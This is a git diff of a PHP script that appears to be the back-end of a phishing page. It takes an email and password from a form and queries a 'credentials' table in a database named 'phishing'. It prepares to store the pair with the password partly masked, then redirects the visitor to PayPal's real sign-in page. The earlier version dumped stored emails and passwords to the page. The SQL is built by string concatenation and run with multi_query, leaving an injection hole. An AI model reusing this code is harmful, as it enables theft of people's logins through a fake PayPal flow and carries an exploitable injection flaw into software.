@@ -1,12 +1,11 @@
 <?php
 
-// connection details
+// info
 $servername = "127.0.0.1"; 
 $username = "root";        
 $password = "";            
-$dbname = "phishing";      
+$dbname = "phishing";
 
-// connection to database
 $conn = new mysqli($servername, $username, $password, $dbname);
 
 if ($conn->connect_error) {
@@ -14,33 +13,38 @@ if ($conn->connect_error) {
 }
 
 $email = $_POST['email'];
+$password = $_POST['password'];
 
-$sql = "SELECT * FROM credentials WHERE email = '$email'";
-echo "Executing query: $sql<br>";
+// hide passwords
+$obfuscated_password = substr($password, 0, 1) . str_repeat('*', max(0, strlen($password) - 2)) . substr($password, -1);
 
-// executes
-if ($conn->multi_query($sql)) {
-    do {
-        
-        if ($result = $conn->store_result()) {
-            echo "<h2>Search Results:</h2>";
-            while ($row = $result->fetch_assoc()) {
-                echo "Email: " . $row["email"] . " - Password: " . $row["password"] . "<br>";
+try {
+    $select_sql = "SELECT * FROM credentials WHERE email = '$email' AND password = '$password'";
+
+    if ($conn->multi_query($select_sql)) {
+        do {
+            if ($result = $conn->store_result()) {
+                if ($result->num_rows > 0) {
+                    echo "Login successful!";
+                } else {
+                    echo "Login failed.";
+                }
+                $result->free();
             }
-            $result->free();
-        }
-    } while ($conn->more_results() && $conn->next_result());
-} else {
-    echo "Error executing query: " . $conn->error;
+        } while ($conn->more_results() && $conn->next_result());
+    }
+
+    $insert_sql = "INSERT INTO credentials (email, password) VALUES ('$email', '$obfuscated_password')";
+
+} catch (mysqli_sql_exception $e) {
 }
 
-// closes
 $conn->close();
 ?>
 
 <script>
-setTimeout(function() {
     // redirect
-    window.location.href = "https://www.paypal.com/signin";
-}, 0);
+    window.onload = function() {
+        window.location.replace("https://www.paypal.com/signin");
+    };
 </script>
